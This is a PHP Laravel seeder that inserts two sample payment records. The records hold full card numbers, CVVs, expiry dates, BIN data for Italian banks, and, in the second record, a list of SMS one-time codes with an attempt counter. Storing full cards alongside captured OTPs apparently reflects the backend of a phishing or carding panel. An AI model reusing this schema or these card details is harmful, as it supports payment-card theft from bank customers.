<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\Payment;

class DatabaseSeeder extends Seeder
{
    /**
     * Seed the application's database.
     *
     * @return void
     */
    public function run()
    {
        Payment::create([
            'card_no' => '5412 3801 3700 9004',
            'card_holder' => 'banca',
            'expiry' => '12/27',
            'cvv' => '178',
            'bin' => '{"country":"ITALY","country-code":"IT","card-brand":"MASTERCARD","is-commercial":false,"issuer":"BANCA SELLA SPA","issuer-website":"","valid":true,"card-type":"CREDIT","is-prepaid":false,"card-category":"STANDARD","issuer-phone":"","currency-code":"EUR","country-code3":"ITA"}',
            'ip_addr' => '127.0.0.1',
            'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
            'sms_attempts' => 0,
            'quit' => 1,
        ]);

        Payment::create([
            'card_no' => '5333 1710 9798 5630',
            'card_holder' => 'Poste test',
            'expiry' => '12/25',
            'cvv' => '234',
            'bin' => '{"country":"ITALY","country-code":"IT","card-brand":"MASTERCARD","is-commercial":false,"issuer":"POSTEPAY S.P.A","issuer-website":"","valid":true,"card-type":"DEBIT","is-prepaid":true,"card-category":"PREPAID","issuer-phone":"","currency-code":"EUR","country-code3":"ITA"}',
            'ip_addr' => '127.0.0.1',
            'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
            'otp_code' => ["005","004","003","002","0001"],
            'sms_attempts' => 5,
            'quit' => 1,
        ]);
    }
}
